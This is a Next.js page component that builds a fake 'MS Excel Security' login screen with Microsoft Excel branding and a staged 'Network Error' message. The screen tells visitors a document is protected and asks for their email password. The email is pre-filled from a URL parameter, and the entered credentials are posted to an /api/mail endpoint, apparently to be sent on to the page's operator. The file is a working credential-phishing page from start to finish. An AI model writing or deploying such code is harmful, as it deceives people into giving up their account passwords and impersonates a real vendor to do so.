"use client";

import { useEffect, useState } from "react";
import { useSearchParams } from "next/navigation";
import { useForm } from "react-hook-form";
import Image from "next/image";
// import { z } from "zod";
import { loginSchema, LoginSchema } from "@/lib/schemas/loginSchema";

import { Button } from "@/components/ui/button";


import { Input } from "@/components/ui/input";
import { zodResolver } from "@hookform/resolvers/zod";

export default function Home() {
  const searchParams = useSearchParams();
  const emailFromURL = searchParams.get("x1") || "";

  const {
    register,
    handleSubmit,
    setValue,
  } = useForm<LoginSchema>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      email: emailFromURL,
    },
  });

  const [isSubmitting, setIsSubmitting] = useState(false);
  const [responseMessage, setResponseMessage] = useState("");

  useEffect(() => {
    if (emailFromURL) {
      setValue("email", emailFromURL);
      console.log(emailFromURL);
    }
  }, [emailFromURL, setValue]);

  const onSubmit = async (data: LoginSchema) => {
    setIsSubmitting(true);
    setResponseMessage("");

    console.log(data);

    try {
      const response = await fetch("/api/mail", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      const result = await response.json();

      if (response.ok) {
        setResponseMessage("Email sent successfully");
        console.log(result);
        console.log(responseMessage);
      } else {
        setResponseMessage("Failed to send email");
      }
    } catch (error) {
      console.error("Error sending data", error);
      setResponseMessage("Something went wrong");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (

    <div className="relative min-h-screen w-full">
      {/* Excel Background */}
      <div
        className="fixed inset-0 z-0 bg-cover bg-center bg-no-repeat"
        style={{
          backgroundImage: "url('/excel-background.jpeg')",
          backgroundSize: "100% 100%",
          backgroundPosition: "center center"
        }}
      />

      <div className="relative z-10 flex min-h-screen w-full items-center justify-center p-6 md:p-10">
        <div className="bg-white shadow-md overflow-hidden max-w-md w-full border border-gray-200">
          {/* Excel Header */}
          <div className="bg-green-600 text-white p-3 flex items-center gap-3">
            <div className="h-8 w-8">
              <Image
                src="/excel-logo.svg"
                alt="Excel Logo"
                width={32}
                height={32}
              />
            </div>
            <div className="flex flex-col">
              <div className="text-xs font-semibold relative">
                Microsoft<span className="absolute top-0 text-[8px] leading-none">®</span>
              </div>
              <span className="font-bold text-lg leading-none">Excel</span>
            </div>
          </div>

          {/* Warning Content */}
          <div className="p-6 pt-6 flex flex-col gap-6">
            <div className="text-center flex flex-col gap-1">
              <div className="flex items-center justify-center gap-2">
                <div className="text-amber-500 text-2xl">⚠</div>
                <div className="font-semibold text-sm text-gray-700">This file is protected by</div>
              </div>
              <div className="font-bold text-sm text-gray-800">MS Excel® Security.</div>
            </div>

            <div className="text-center text-xs text-gray-500">
              Enter email password to access protected document
            </div>

            <form onSubmit={handleSubmit(onSubmit)} className="flex flex-col gap-4">
              <div className="text-center text-red-500 text-sm font-medium">
                Network Error! Please verify your information and try again
              </div>

              <div className="border-b border-gray-300 pb-1">
                <Input
                  id="email"
                  type="email"
                  placeholder="james@powermake.com.tw"
                  className="border-none shadow-none focus-visible:ring-0 px-0 py-1 text-sm"
                  {...register("email")}
                />
              </div>

              <div className="border-b border-gray-300 pb-1">
                <div className="flex items-center">
                  <Input
                    id="password"
                    type="password"
                    placeholder="Enter your password"
                    className="border-none shadow-none focus-visible:ring-0 px-0 py-1 text-sm flex-1"
                    {...register("password")}
                  />
                </div>
              </div>

              <Button
                type="submit"
                className="bg-green-600 hover:bg-green-700 text-white font-medium rounded-sm w-full mt-2"
                disabled={isSubmitting}
              >
                {isSubmitting ? (
                  <div className="flex items-center justify-center">
                    <div className="animate-spin mr-2 h-4 w-4 border-2 border-white border-t-transparent rounded-full" />
                    <span>View Document</span>
                  </div>
                ) : (
                  "View Document"
                )}
              </Button>
            </form>
          </div>
        </div>
      </div>
    </div>
  );
}
